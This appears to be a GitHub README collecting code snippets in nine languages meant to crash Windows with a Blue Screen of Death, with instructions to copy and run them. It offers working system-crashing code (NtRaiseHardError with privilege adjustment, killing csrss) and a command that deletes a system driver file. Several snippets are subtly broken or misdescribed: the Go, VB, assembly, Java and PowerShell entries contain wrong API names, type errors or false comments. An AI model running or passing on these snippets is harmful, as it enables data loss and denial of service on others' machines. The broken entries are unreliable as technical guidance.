# BSOD-in-every-language

"BSOD-in-every-language" is a collection of code snippets in various programming languages that can trigger a Windows BSOD. The repository is intended for educational and research purposes only and aims to showcase how programming languages can interact with the Windows operating system in unexpected ways.


## Codes

<details>
    <summary>C++ (click to expand/collapse)</summary>

```cpp
#include <iostream>
#include <Windows.h>
#include <winternl.h>
using namespace std;
typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
int main()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
    return 0;
}
```

</details>

<details>
    <summary>C# (click to expand/collapse)</summary>

```cs
System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
```

</details>
    
    
<details>
    <summary>Python (click to expand/collapse)</summary>

```py
import ctypes
ntdll = ctypes.windll.ntdll
prev_value = ctypes.c_bool()
res = ctypes.c_ulong()
ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
    print("BSOD Successfull!")
else:
    print("BSOD Failed...")
```

</details>
    
    
    
<details>
    <summary>Golang (click to expand/collapse)</summary>

```go
import "fmt"
import "syscall"

func main() {
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    ntRaiseHardError := kernel32.MustFindProc("RaiseHardError")
    var p uintptr
    var b [256]byte
    for i := 0; i < len(b); i++ {
        b[i] = byte(i)
    }
    ntRaiseHardError.Call(0xc0000022, 0, 0, uintptr(unsafe.Pointer(&b[0])))
    fmt.Println("You should never see this message")
}
```

</details>
    
    
<details>
    <summary>VB.Net (click to expand/collapse)</summary>

```vb
Private Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal NewValue As Long, ByVal Flags As Long, ByRef ReturnLength As Long) As Long
Private Declare Function NtRaiseHardError Lib "ntdll" (ByVal ErrorStatus As Long, ByVal NumberOfParameters As Long, ByVal UnicodeStringParameterMask As Long, ByVal Parameters As Long, ByVal ValidResponseOption As Long, ByRef Response As Long) As Long

Private Const SE_SHUTDOWN_NAME As String = "SeShutdownPrivilege"
Private Const ERROR_BLUESCREEN As Long = &HC0000022

Private Sub BSOD()
    Dim Result As Long, ReturnLength As Long
    Result = RtlAdjustPrivilege(SE_SHUTDOWN_NAME, True, False, ReturnLength)
    Result = NtRaiseHardError(ERROR_BLUESCREEN, 0, 0, 0, 6, Result)
End Sub

```

</details>
    
    
<details>
    <summary>JAVA (click to expand/collapse)</summary>

```java
public class BSOD {
  public static void main(String[] args) {
    while (true) {
      Runtime.getRuntime().exec("cmd /c echo \"Error!\" >> C:\\WINDOWS\\system32\\log.txt");
    }
  }
}

```

</details>
    
<details>
    <summary>Assembly (click to expand/collapse)</summary>

```css
BITS 32

pushad ; push all general-purpose registers onto the stack
mov eax, fs:[30h] ; get a pointer to the KPCR (Kernel Processor Control Region) structure
mov eax, [eax + 124h] ; get a pointer to the KPRCB (Kernel Processor Control Block) structure
mov eax, [eax + 44h] ; get a pointer to the current thread's KTHREAD structure
mov eax, [eax + 84h] ; get a pointer to the current thread's ETHREAD structure
mov eax, [eax + 0F8h] ; get a pointer to the current thread's TEB (Thread Environment Block) structure
mov eax, [eax + 18h] ; get a pointer to the current thread's PEB (Process Environment Block) structure
mov eax, [eax + 0Ch] ; get a pointer to the current process's PEB_LDR_DATA structure
mov eax, [eax + 0Ch] ; get a pointer to the current process's first LDR_DATA_TABLE_ENTRY structure
mov edx, [eax + 10h] ; get a pointer to the current process's image base
mov eax, [eax] ; get a pointer to the current process's entry point

call eax ; call the current process's entry point

popad ; restore all general-purpose registers from the stack
ret ; return to the caller
```

</details>
    
<details>
    <summary>CMD (click to expand/collapse)</summary>

```css
del C:\Windows\System32\drivers\vgapnp.sys
```

</details>
    
    
<details>
    <summary>PowerShell (click to expand/collapse)</summary>

```ps
$buf = "A" * 10000000
while($true)
{
   $buf += "A" * 10000000
}
```

</details>
    
    
    
    
## Usage

**WARNING: Running this code on your computer can cause a Blue Screen of Death (BSOD) and result in data loss. Use at your own risk.**

To test the code snippets in this repository, you will need a Windows computer. Simply copy and paste the code into a file with the appropriate file extension for the programming language you are using, and run the code on your computer.

## Contributing

Contributions to this repository are welcome! If you have code snippets that can trigger a BSOD in a programming language that is not currently represented in the repository, please feel free to submit a pull request.

## License

This repository is licensed under the [MIT License](LICENSE).
